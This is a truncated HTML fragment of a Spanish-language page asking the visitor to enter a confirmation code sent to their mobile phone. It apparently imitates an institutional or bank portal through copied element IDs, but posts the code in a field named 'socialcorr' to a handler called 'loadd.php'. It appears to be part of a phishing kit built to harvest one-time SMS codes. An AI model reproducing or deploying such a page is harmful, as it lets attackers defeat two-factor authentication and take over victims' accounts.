...
//--></script><form id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar" method="post" action="loadd.php">
					...
					<div class="contenedorArticulos">
						...
						<br><span id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:camposEntrada">
							<div class="contenedor">
								...
								<center><span class="enunciado">Ingrese el <span style="font-weight: 600;">Código de confirmación</span> enviado a su celular.</span>
								</center>
								<br>
								<div class="columna">
								...
								<div class="columna">
									<br>
									<input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:numeroDocumento" name="socialcorr" type="text" maxlength="30" class="BGinputbox" autocomplete="off" requerid="">
...
<tr><td>
	<input id="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:continuar" name="viewns_Z7_KQ84HOK0298RE0688624FQ3GI0_:formAutenticar:continuar" type="submit" value="Continuar" style="font-size: 14px;margin: 21px 0 0;background-color: #ED1C27;
    border: none;
    border-radius: 5px;
    width: 90px;
    padding: 8px 0 10px;
